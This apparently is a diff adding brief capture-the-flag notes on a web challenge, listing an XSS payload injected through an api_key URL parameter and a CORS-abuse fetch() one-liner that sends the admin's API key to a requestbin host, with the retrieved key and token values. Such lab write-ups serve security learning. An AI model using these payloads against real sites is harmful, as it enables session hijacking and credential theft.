@@ -1,0 +1,24 @@
+XSS
+	<script>
+        const API_TOKEN = "{{{ token }}}";
+    </script>
+
+    https://wimc.ctf.allesctf.net/?api_key=%22%2balert(1)//
+
+Misconfigured CORS (Cross-origin resource sharing)
+	Resource: https://blog.bi.tk/chrome-cors/
+	Access-Control-Allow-Origin was set to * for /1.0/user
+
+	# Get admin API key
+	fetch("https://api.wimc.ctf.allesctf.net/1.0/user", {method:"GET",cache:"force-cache"}).then(a => a.json()).then(b => document.location.href=requestbin + b["data"]["api_key"]);
+
+	python3 stage1.py (get malicious url)
+	Post the url to https://wimc.ctf.allesctf.net/support (admin will visit)
+	Get key: 980a0deeeaa5261687fb6ad2e37561
+
+Get admin API Token
+	python3 stage2.py
+	Got token: d88a7e6267752ce0f44044cd080882
+	https://wimc.ctf.allesctf.net/?api_key=d88a7e6267752ce0f44044cd080882
+	https://wimc.ctf.allesctf.net/wallets
+	Get flag
